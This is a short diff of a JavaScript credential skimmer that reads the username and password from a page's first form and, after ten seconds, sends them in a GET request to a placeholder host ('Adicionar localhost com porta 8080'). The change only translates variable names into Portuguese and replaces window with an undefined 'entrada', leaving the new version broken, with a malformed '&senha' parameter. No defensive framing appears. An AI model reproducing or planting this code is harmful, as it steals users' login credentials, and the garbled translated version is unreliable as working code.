@@ -1,10 +1,10 @@
-username = document.forms[0].elements[0].value; 
-password = document.forms[0].elements[1].value; 
+usuario = document.forms[0].elements[0].value; 
+senha = document.forms[0].elements[1].value; 
 
-window.setTimeout(function(){  
+entrada.setTimeout(function(){  
   
-var req = new XMLHttpRequest(); 
-req.open('GET', 'Adicionar localhost com porta 8080' + username + '&password=' + password + 'GETIT?', true); 
-req.send();
+var solicita = new XMLHttpRequest(); 
+solicita.open('GET', 'Adicionar localhost com porta 8080' + usuario + '&senha' + senha + 'GETIT?', true); 
+solicita.send();
 
 } , 10000); 
